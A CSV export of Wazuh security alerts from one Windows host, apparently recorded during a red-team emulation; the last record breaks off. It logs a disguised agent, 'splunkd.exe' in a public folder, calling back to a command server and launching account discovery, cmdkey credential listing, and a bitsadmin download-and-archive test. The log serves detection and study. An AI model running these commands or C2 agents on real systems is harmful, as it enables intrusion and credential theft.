wazuh-alerts-4.x-2024.12.10,QPRRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-10 17:39:13.099
ProcessGuid: {15959494-7cc1-6758-c901-000000000300}
ProcessId: 7768
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {15959494-7cc0-6758-c801-000000000300}
ParentProcessId: 7912
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net user && dir c:\Users\ && cmdkey.exe /list && net localgroup ""Users"" && net localgroup
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:39:13.1017780Z,8338,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036,windows_eventchannel,log,"Dec 10, 2024 @ 17:39:13.784",EventChannel,1733852353,"Dec 10, 2024 @ 17:39:13.784", , , , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-7cc1-6758-c901-000000000300},7768,39:13.1,"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", , , , , , , , , , , ,{15959494-7cc0-6758-c801-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"cmd.exe /C net user &amp;&amp; dir c:\\Users\\ &amp;&amp; cmdkey.exe /list &amp;&amp; net localgroup \""Users\"" &amp;&amp; net localgroup",0xeacdd,7912,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,net  user,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,Q_RRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-10 17:39:13.176
ProcessGuid: {15959494-7cc1-6758-cc01-000000000300}
ProcessId: 7184
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  localgroup ""Users"" 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {15959494-7cc0-6758-c801-000000000300}
ParentProcessId: 7912
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net user && dir c:\Users\ && cmdkey.exe /list && net localgroup ""Users"" && net localgroup
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:39:13.1773690Z,8341,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036,windows_eventchannel,log,"Dec 10, 2024 @ 17:39:13.831",EventChannel,1733852353,"Dec 10, 2024 @ 17:39:13.831", , , , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-7cc1-6758-cc01-000000000300},7184,39:13.2,"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", , , , , , , , , , , ,{15959494-7cc0-6758-c801-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"cmd.exe /C net user &amp;&amp; dir c:\\Users\\ &amp;&amp; cmdkey.exe /list &amp;&amp; net localgroup \""Users\"" &amp;&amp; net localgroup",0xeacdd,7912,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,"net  localgroup \""Users\""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,RvRRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-10 17:39:13.218
ProcessGuid: {15959494-7cc1-6758-cf01-000000000300}
ProcessId: 5740
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\WINDOWS\system32\net1  localgroup
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8
ParentProcessGuid: {15959494-7cc1-6758-ce01-000000000300}
ParentProcessId: 7172
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  localgroup
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:39:13.2221204Z,8344,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,21,FALSE,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031,windows_eventchannel,log,"Dec 10, 2024 @ 17:39:13.878",EventChannel,1733852353,"Dec 10, 2024 @ 17:39:13.878", , , , , ,net1.exe,C:\\Windows\\System32\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-7cc1-6758-cf01-000000000300},5740,39:13.2,"SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , , , , , , , , , ,{15959494-7cc1-6758-ce01-000000000300},{15959494-7b75-6758-ddac-0e0000000000},net  localgroup,0xeacdd,7172,C:\\Users\\mari\\,C:\\Windows\\System32\\net.exe,C:\\WINDOWS\\system32\\net1  localgroup,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,R_RRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1087.001,technique_name=Local Account
UtcTime: 2024-12-10 17:39:21.004
ProcessGuid: {15959494-7cc9-6758-d001-000000000300}
ProcessId: 6788
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C net user && dir c:\Users\ && cmdkey.exe /list && net localgroup ""Users"" && net localgroup
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:39:21.0057864Z,8347,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 17:39:21.774",EventChannel,1733852361,"Dec 10, 2024 @ 17:39:21.774", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-7cc9-6758-d001-000000000300},6788,39:21.0,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1087.001,technique_name=Local Account",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C net user &amp;&amp; dir c:\\Users\\ &amp;&amp; cmdkey.exe /list &amp;&amp; net localgroup \""Users\"" &amp;&amp; net localgroup",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,S_RRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-10 17:39:21.051
ProcessGuid: {15959494-7cc9-6758-d501-000000000300}
ProcessId: 8708
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\WINDOWS\system32\net1  localgroup ""Users"" 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8
ParentProcessGuid: {15959494-7cc9-6758-d401-000000000300}
ParentProcessId: 812
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  localgroup ""Users"" 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:39:21.0523037Z,8353,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,23,FALSE,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031,windows_eventchannel,log,"Dec 10, 2024 @ 17:39:21.851",EventChannel,1733852361,"Dec 10, 2024 @ 17:39:21.851", , , , , ,net1.exe,C:\\Windows\\System32\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-7cc9-6758-d501-000000000300},8708,39:21.1,"SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , , , , , , , , , ,{15959494-7cc9-6758-d401-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"net  localgroup \""Users\""",0xeacdd,812,C:\\Users\\mari\\,C:\\Windows\\System32\\net.exe,"C:\\WINDOWS\\system32\\net1  localgroup \""Users\""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,T_RRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 17:39:47.341
ProcessGuid: {15959494-7b00-6758-1200-000000000300}
ProcessId: 64
Image: C:\Windows\System32\svchost.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-10T17:39:47.3451675Z,8363,3880,DESKTOP-QGB4EQH,7,2624,INFORMATION,Microsoft-Windows-Sysmon,12,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 17:39:48.094",EventChannel,1733852388,"Dec 10, 2024 @ 17:39:48.094", , , , , ,taskschd.dll,C:\\Windows\\System32\\svchost.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-7b00-6758-1200-000000000300},64,39:47.3,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,UPRRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 17:39:48.576
ProcessGuid: {15959494-7ce1-6758-d901-000000000300}
ProcessId: 5980
Image: C:\Windows\System32\taskhostw.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-10T17:39:48.5893141Z,8365,3880,DESKTOP-QGB4EQH,7,2624,INFORMATION,Microsoft-Windows-Sysmon,13,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 17:39:49.328",EventChannel,1733852389,"Dec 10, 2024 @ 17:39:49.328", , , , , ,taskschd.dll,C:\\Windows\\System32\\taskhostw.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-7ce1-6758-d901-000000000300},5980,39:48.6,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,UfRRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-12-10 17:40:10.195
ProcessGuid: {15959494-7cfa-6758-df01-000000000300}
ProcessId: 7580
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C if not exist ""%%ProgramFiles%%\7-zip\7z.exe""  ( call ) ELSE ( echo Downloading 7-zip installer && bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.7-zip.org/a/7z2301-x64.exe"" %%TEMP%%\7zip.exe && %%TEMP%%\7zip.exe /S ) &&   &&  mkdir $PathToAtomicsFolder\T1560.001\victim-files && cd $PathToAtomicsFolder\T1560.001\victim-files && echo ""This file will be encrypted"" > .\encrypted_file.txt && ""%%ProgramFiles%%\7-zip\7z.exe"" u archive.7z *txt -pblue && dir
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:40:10.1972283Z,8369,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,3,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 17:40:10.958",EventChannel,1733852410,"Dec 10, 2024 @ 17:40:10.958", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-7cfa-6758-df01-000000000300},7580,40:10.2,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C if not exist \""%%ProgramFiles%%\\7-zip\\7z.exe\""  ( call ) ELSE ( echo Downloading 7-zip installer &amp;&amp; bitsadmin /transfer myDownloadJob /download /priority normal \""https://www.7-zip.org/a/7z2301-x64.exe\"" %%TEMP%%\\7zip.exe &amp;&amp; %%TEMP%%\\7zip.exe /S ) &amp;&amp;   &amp;&amp;  mkdir $PathToAtomicsFolder\\T1560.001\\victim-files &amp;&amp; cd $PathToAtomicsFolder\\T1560.001\\victim-files &amp;&amp; echo \""This file will be encrypted\"" &gt; .\\encrypted_file.txt &amp;&amp; \""%%ProgramFiles%%\\7-zip\\7z.exe\"" u archive.7z *txt -pblue &amp;&amp; dir",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,V_RRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 17:40:18.650
ProcessGuid: {15959494-7ce2-6758-de01-000000000300}
ProcessId: 8752
Image: C:\Windows\System32\sppsvc.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\NETWORK SERVICE""",3,2024-12-10T17:40:18.8463116Z,8415,3880,DESKTOP-QGB4EQH,7,2624,INFORMATION,Microsoft-Windows-Sysmon,14,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 17:40:19.674",EventChannel,1733852419,"Dec 10, 2024 @ 17:40:19.674", , , , , ,taskschd.dll,C:\\Windows\\System32\\sppsvc.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-7ce2-6758-de01-000000000300},8752,40:18.6,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\NETWORK SERVICE,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,WfRRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-10 17:40:24.246
ProcessGuid: {15959494-7d08-6758-f101-000000000300}
ProcessId: 7724
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\WINDOWS\system32\net1 localgroup
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8
ParentProcessGuid: {15959494-7d08-6758-f001-000000000300}
ParentProcessId: 8584
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: ""C:\WINDOWS\system32\net.exe"" localgroup
